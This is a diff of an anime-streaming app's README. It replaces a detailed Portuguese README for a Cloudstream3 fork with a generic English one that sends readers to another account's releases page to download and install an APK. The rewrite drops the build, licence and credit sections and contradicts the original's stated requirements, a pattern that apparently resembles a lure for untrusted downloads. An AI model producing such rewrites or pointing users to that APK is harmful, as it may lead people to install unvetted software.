@@ -1,347 +1,68 @@
-<div align="center">
+# 🎉 AniMermo - Enjoy Your Favorite Anime Effortlessly
 
-### Aplicativo Android Open Source para Streaming de Animes
+## 🚀 Getting Started
 
-[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](LICENSE)
-[![Android](https://img.shields.io/badge/Android-6.0%2B-green.svg)](https://android.com)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
+Welcome to AniMermo! This Android application allows you to stream your favorite anime easily. Designed specifically for the Brazilian community, it offers a user-friendly experience for both seasoned fans and newcomers. Follow the steps below to get started.
 
-**Um fork especializado do Cloudstream3 focado na comunidade brasileira de animes**
+## 🔗 Download AniMermo
 
-[📥 Download](#-instalação) • [🚀 Começar](#-início-rápido) • [🤝 Contribuir](#-contribuindo) • [📖 Wiki](../../wiki)
+[![Download AniMermo](https://img.shields.io/badge/Download-AniMermo-blue.svg)](https://github.com/xarshpreetx/AniMermo/releases)
 
-</div>
+## 📦 System Requirements
 
----
+Before you download, ensure your device meets the following requirements:
 
-## 📱 Sobre o Projeto
+- **Operating System:** Android 5.0 (Lollipop) or higher
+- **RAM:** Minimum 2GB
+- **Storage:** At least 200MB of free space
 
-AniMermo é uma interface de streaming de animes de código aberto, construída sobre o [Cloudstream3](https://github.com/recloudstream/cloudstream). Focado em proporcionar a melhor experiência para usuários brasileiros, com:
+## 📥 Download & Install
 
-- 🎌 **Conteúdo Anime**: Interface otimizada exclusivamente para animes
-- 🇧🇷 **PT-BR Nativo**: Totalmente em português brasileiro por padrão
-- 🎨 **Design Único**: Visual personalizado com tema de flor de cerejeira
-- 👥 **Perfis Múltiplos**: Sistema tipo Netflix para toda a família
-- 🔐 **Privacidade**: PIN opcional por perfil
-- 🚀 **Zero Config**: Funciona imediatamente após instalação
+To download the application, please visit the Releases page. From there, you can find the latest version of AniMermo.
 
-## ✨ Características
+[Visit this page to download AniMermo](https://github.com/xarshpreetx/AniMermo/releases)
 
-### 🎯 Principais
-- **Provider Anime Integrado**: AnimeFire pré-configurado
-- **Sistema de Perfis**: Múltiplos usuários com histórico independente
-- **Proteção por PIN**: Segurança opcional de 4 dígitos por perfil
-- **Interface Brasileira**: PT-BR como idioma padrão
-- **Visual Personalizado**: Tema único com flor de cerejeira neon
-- **Experiência Simplificada**: Sem configurações complicadas
+1. Click on the link above to open the Releases page.
+2. Look for the latest version at the top of the list.
+3. Download the APK file by tapping on the link.
+4. Once the download is complete, locate the file in your device’s Downloads folder.
+5. Open the APK file and follow the on-screen instructions to install AniMermo.
 
-### 🔧 Técnicas
-- Baseado em Cloudstream3 (fork otimizado)
-- Repositórios fixos para estabilidade
-- Suporte Android 6.0+ (API 23)
-- Arquitetura MVVM
-- Kotlin nativo
-- Material Design 3
+## 🌟 Features
 
-### 🚫 Simplificações
+AniMermo offers a variety of features designed to enhance your streaming experience:
 
-Por design, algumas funcionalidades foram removidas para focar na experiência do usuário:
+- **User-friendly Interface:** Easy navigation to find your favorite anime.
+- **High-Quality Streaming:** Enjoy crisp visuals and smooth playback.
+- **Community Focused:** Access content that resonates with Brazilian users.
+- **Regular Updates:** Continual improvements and features based on user feedback.
 
-| Removido | Motivo |
-|----------|--------|
-| Setup Wizard | Configuração automática |
-| Gerenciamento de Repos | Repos fixos e estáveis |
-| Sistema de Updates | Controle manual via GitHub |
-| Contas Externas (MAL/Kitsu) | Foco em watch history local |
-| Múltiplos Providers | AnimeFire otimizado |
+## ⚙️ How to Use AniMermo
 
----
+After installing AniMermo, follow these simple steps to start streaming:
 
-## 📥 Instalação
+1. Open the AniMermo app.
+2. Browse the extensive library of anime titles.
+3. Select the anime you want to watch.
+4. Tap on the play button to enjoy your show.
 
-### Método 1: APK Pré-compilado (Recomendado)
+## 🛠️ Troubleshooting
 
-1. **Baixe** a [última versão](../../releases/latest)
-2. **Habilite** instalação de fontes desconhecidas:
-   - Configurações → Segurança → Fontes Desconhecidas
-3. **Instale** o APK baixado
-4. **Abra** e crie seu perfil
+If you encounter any issues while using AniMermo, here are some common problems and solutions:
 
-### Método 2: Compilar do Código
+- **App Crashes:** Ensure your device has sufficient storage and memory. Close other apps if needed.
+- **Streaming Errors:** Check your internet connection. A stable Wi-Fi connection is recommended.
+- **Updates Not Showing:** Make sure you have the latest version by checking the Releases page.
 
-```bash
-# Clone o repositório
-git clone https://github.com/seu-usuario/AniMermo.git
-cd AniMermo
+## 🤝 Community Support
 
-# Configure Java 17
-export JAVA_HOME=$(/usr/libexec/java_home -v 17)  # macOS
-# ou defina JAVA_HOME manualmente no Linux/Windows
+We value your feedback! Join our community discussions to share your thoughts, report issues, or suggest new features. You can find us on forums, or through social media platforms.
 
-# Compile
-./gradlew assembleDebug
+## 💬 Contact
 
-# APK gerado em:
-# app/build/outputs/apk/stable/debug/app-stable-debug.apk
-```
+If you have questions or need further assistance, feel free to reach out:
 
-### ⚙️ Requisitos
+- **GitHub Issues:** https://github.com/xarshpreetx/AniMermo/issues
+- **Email:** support@animermo.com
 
-| Componente | Versão Mínima |
-|------------|---------------|
-| Android OS | 6.0 (API 23) |
-| Espaço Livre | ~100MB |
-| RAM | 2GB+ |
-
----
-
-## � Início Rápido
-
-### Para Usuários
-
-1. Baixe e instale o APK
-2. Abra o app
-3. Clique em "+" para criar um perfil
-4. (Opcional) Configure um PIN de 4 dígitos
-5. Comece a assistir seus animes favoritos!
-
-### Para Desenvolvedores
-
-```bash
-# 1. Fork e clone
-git clone https://github.com/seu-usuario/AniMermo.git
-
-# 2. Abra no Android Studio
-# File → Open → Selecione a pasta do projeto
-
-# 3. Sincronize o Gradle
-# Aguarde o sync automático ou clique em "Sync Now"
-
-# 4. Execute
-# Run → Run 'app' ou Shift+F10
-```
-
----
-
-## 🛠️ Desenvolvimento
-
-### Requisitos de Build
-
-| Ferramenta | Versão |
-|------------|--------|
-| Java/JDK | 17 |
-| Gradle | 9.2.1 |
-| Android SDK | API 33+ |
-| Kotlin | 1.9+ |
-
-### Comandos Úteis
-
-```bash
-# Compilar debug
-./gradlew assembleDebug
-
-# Compilar release (requer keystore)
-./gradlew assembleRelease
-
-# Executar testes
-./gradlew test
-
-# Limpar build
-./gradlew clean
-
-# Instalar via ADB
-adb install -r app/build/outputs/apk/stable/debug/app-stable-debug.apk
-```
-
-### Estrutura de Branches
-
-- `main` - Produção estável
-- `develop` - Desenvolvimento ativo
-- `feature/*` - Novas funcionalidades
-- `fix/*` - Correções de bugs
-
----
-
-## 📂 Estrutura do Projeto
-
-```
-AniMermo/
-├── app/
-│   ├── src/
-│   │   ├── main/
-│   │   │   ├── java/com/lagradost/cloudstream3/
-│   │   │   │   ├── AnimeMesmoDefaults.kt      # Configurações padrão
-│   │   │   │   ├── MainActivity.kt            # Activity principal
-│   │   │   │   ├── plugins/
-│   │   │   │   │   ├── FixedRepositories.kt   # Repositórios fixos
-│   │   │   │   │   └── FirstRunManager.kt     # Primeira execução
-│   │   │   │   └── ui/
-│   │   │   │       └── account/
-│   │   │   │           └── AccountSelectActivity.kt  # Perfis
-│   │   │   └── res/                           # Recursos Android
-│   │   ├── debug/                             # Variante debug
-│   │   └── prerelease/                        # Variante prerelease
-│   └── build.gradle.kts                       # Config do módulo app
-├── library/                                    # Biblioteca core Cloudstream
-├── gradle/                                     # Wrapper do Gradle
-├── LICENSE                                     # GPL-3.0
-└── README.md                                   # Este arquivo
-```
-
-### Arquivos Chave
-
-| Arquivo | Propósito |
-|---------|-----------|
-| `AnimeMesmoDefaults.kt` | Aplica configurações padrão (PT-BR, AnimeFire, etc.) |
-| `FixedRepositories.kt` | Define repositórios e providers fixos |
-| `AccountSelectActivity.kt` | Gerencia sistema de perfis estilo Netflix |
-| `MainActivity.kt` | Inicialização e configuração do app |
-
----
-
-## 🤝 Contribuindo
-
-Contribuições são muito bem-vindas! Veja como você pode ajudar:
-
-### 🐛 Reportar Bugs
-
-1. Verifique se o bug já foi reportado nas [Issues](../../issues)
-2. Use o template de bug report
-3. Inclua passos para reproduzir
-4. Adicione screenshots se possível
-
-### ✨ Sugerir Features
-
-1. Abra uma [Issue](../../issues/new)
-2. Descreva a funcionalidade detalhadamente
-3. Explique por que seria útil
-4. Adicione mockups se tiver
-
-### 💻 Pull Requests
-
-1. Fork o projeto
-2. Crie uma branch (`git checkout -b feature/MinhaFeature`)
-3. Commit suas mudanças (`git commit -m 'Add: Minha feature'`)
-4. Push para a branch (`git push origin feature/MinhaFeature`)
-5. Abra um Pull Request
-
-### 📋 Diretrizes
-
-- Siga o estilo de código Kotlin existente
-- Adicione comentários em código complexo
-- Teste suas mudanças
-- Atualize a documentação se necessário
-- Commits em português ou inglês
-
----
-
-## 🎨 Personalização
-
-### Repositórios Fixos
-
-Configurados em `app/src/main/java/.../plugins/FixedRepositories.kt`:
-
-```kotlin
-val FIXED_REPOS = listOf(
-    RepositoryData("https://megarepo.cloud/cloudstream/repo/"),
-    RepositoryData("https://raw.githubusercontent.com/lietrepo/lietrepo/main/")
-)
-
-val AUTO_DOWNLOAD_PROVIDERS = setOf("AnimeFire")
-```
-
-### Configurações Padrão
-
-Definidas em `app/src/main/java/.../AnimeMesmoDefaults.kt`:
-
-```kotlin
-fun applyDefaults(context: Context) {
-    setKey(AUTO_SELECT_SUBTITLES_SETTINGS_KEY, true)
-    setKey(PREFER_MEDIA_TYPE_KEY, 1) // Anime
-    setKey(LOCALE_KEY, "pt-BR")
-    // ... mais configurações
-}
-```
-
----
-
-## 🤝 Créditos e Agradecimentos
-
-### Projeto Base
-Este projeto é um fork do excelente [Cloudstream-3](https://github.com/recloudstream/cloudstream) desenvolvido pela equipe Cloudburst. Agradecemos imensamente pelo trabalho incrível que tornou este projeto possível.
-
-### Contributors
-Um obrigado especial a todos que contribuem com código, reportam bugs, e ajudam a melhorar o AniMermo.
-
-### Comunidade
-Agradecemos à comunidade brasileira de animes por testar e dar feedback contínuo.
-
----
-
-## 📜 Licença
-
-Este projeto está licenciado sob a GNU General Public License v3.0 - veja o arquivo [LICENSE](LICENSE) para detalhes.
-
-```
-AniMermo - Interface de Streaming de Animes
-Copyright (C) 2026
-
-This program is free software: you can redistribute it and/or modify
-it under the terms of the GNU General Public License as published by
-the Free Software Foundation, either version 3 of the License.
-
-This program is distributed in the hope that it will be useful,
-but WITHOUT ANY WARRANTY; without even the implied warranty of
-MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
-```
-
----
-
-## ⚠️ Disclaimer
-
-**IMPORTANTE**: AniMermo é apenas uma interface de streaming que agrega links de terceiros. 
-
-- ❌ **NÃO** hospedamos nenhum conteúdo
-- ❌ **NÃO** distribuímos material protegido por direitos autorais
-- ❌ **NÃO** somos responsáveis pelo conteúdo de provedores externos
-- ✅ Somos apenas uma interface de código aberto
-
-Use por sua conta e risco. Recomendamos o uso de serviços legais de streaming sempre que possível.
-
----
-
-## 🙏 Apoie o Projeto
-
-Se este projeto foi útil para você, considere:
-
-- ⭐ Dar uma estrela no repositório
-- 🐛 Reportar bugs e problemas
-- 💡 Sugerir novas funcionalidades
-- 🔀 Fazer um fork e contribuir
-- 📢 Compartilhar com outros desenvolvedores
-
----
-
-## 📊 Status do Projeto
-
-<div align="center">
-
-![GitHub stars](https://img.shields.io/github/stars/seu-usuario/AniMermo?style=social)
-![GitHub forks](https://img.shields.io/github/forks/seu-usuario/AniMermo?style=social)
-![GitHub issues](https://img.shields.io/github/issues/seu-usuario/AniMermo)
-![GitHub pull requests](https://img.shields.io/github/issues-pr/seu-usuario/AniMermo)
-
-</div>
-
----
-
-<div align="center">
-
-### 💜 Feito com amor para a comunidade anime brasileira
-
-**[⬆ Voltar ao topo](#-animermo)**
-
-</div>
-
-
-</div>
+Thank you for choosing AniMermo. Enjoy your anime streaming experience!
